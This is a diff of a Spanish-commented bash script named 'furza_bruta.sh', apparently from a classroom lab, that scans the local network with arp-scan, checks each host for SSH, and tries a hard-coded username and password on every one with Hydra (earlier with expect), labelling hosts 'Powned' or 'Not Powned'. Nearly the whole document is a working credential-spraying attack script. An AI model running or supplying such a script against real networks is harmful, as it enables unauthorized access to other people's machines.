@@ -1,68 +1,49 @@
+  GNU nano 6.3                                       furza_bruta.sh                                                
 #!/bin/bash
-
-# Función para verificar si el servicio SSH está activo en un host dado
-check_ssh_service() {
-    nc -z -w5 "$1" 22
-    if [ $? -eq 0 ]; then
-        return 0  # Servicio SSH activo
-    else
-        return 1  # Servicio SSH no activo
-    fi
-}
-
-# Función para intentar conectar por SSH y comprobar si es exitoso
-check_ssh_connection() {
-    expect -c "
-        spawn ssh -o StrictHostKeyChecking=no $1@$3
-        expect {
-            \"Are you sure you want to continue connecting\" {
-                send \"yes\r\"
-                expect \"assword:\"
-                send \"$2\r\"
-                expect eof
-            }
-            \"assword:\" {
-                send \"$2\r\"
-                expect eof
-            }
-        }
-    " &>/dev/null
-    if [ $? -eq 0 ]; then
-        echo -e "| $3 | Powned   |"
-    else
-        echo -e "| $3 | Not Powned |"
-    fi
-}
 
 # Solicitar al usuario la interfaz de red deseada
 read -p "Ingrese la interfaz de red deseada (por ejemplo, lo, eth0, tun0): " interface
 
-# Verificar si se proporciona una dirección IP
-if [ -z "$1" ]; then
-    echo "Uso: $0 <rango-de-IP>"
+# Verificar la información de la interfaz de red ingresada por el usuario
+ip addr show dev "$interface" > /dev/null 2>&1
+if [ $? -ne 0 ]; then
+    echo "La interfaz de red especificada no es válida."
     exit 1
 fi
 
+# Obtener la dirección IP y la máscara de red de la interfaz seleccionada
+ip_address=$(ip a show dev "$interface" | awk '/inet / {print $2}')
+network_mask=$(ip a show dev "$interface" | awk '/inet / {print $2}' | awk -F '/' '{print $2}')
+
 # Escanear hosts en la red especificada utilizando la interfaz proporcionada
-echo "Escaneando hosts en la red $1 utilizando la interfaz $interface..."
+echo "Escaneando hosts en la red $ip_address/$network_mask utilizando la interfaz $interface..."
 hosts=$(sudo arp-scan --interface="$interface" --localnet | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')
 
 # Mostrar la tabla de resultados
 echo "--------------------------------------------------"
-echo "|   IP        |   Estado del Servicio SSH   |  Estado de Acceso   |"
+printf "| %-15s | %-15s | %-20s |\n" "IP" "Estado del Servicio SSH" "Estado de Acceso"
 echo "--------------------------------------------------"
+
+# Iterar sobre cada host encontrado
 for host in $hosts; do
-    if check_ssh_service "$host"; then
-        check_ssh_connection "alumne" "alumnealumne" "$host" &
-        if [ $? -eq 0 ]; then
-            ssh_status="Activo"
-        else
-            ssh_status="No activo"
-        fi
+    # Verificar si el servicio SSH está activo en el host
+    nc -z -w5 "$host" 22
+    if [ $? -eq 0 ]; then
+        ssh_status="Activo"
     else
-        ssh_status="No disponible"
-        echo -e "| $host | $ssh_status | SSH no disponible |"
+        ssh_status="No activo"
     fi
+    
+    # Intentar iniciar sesión con credenciales utilizando Hydra y capturar el resultado en una variable
+    result=$(hydra -l alumne -p alumnealumne  ssh://"$host" -s 22 -f -vV 2>&1)
+    # Verificar el resultado de Hydra
+    if [[ $result == *"success"* ]]; then
+        access_status="Powned"
+    else
+        access_status="Not Powned"
+    fi
+    
+    printf "| %-15s | %-15s | %-20s |\n" "$host" "$ssh_status" "$access_status"
 done
-wait
+
 echo "--------------------------------------------------"
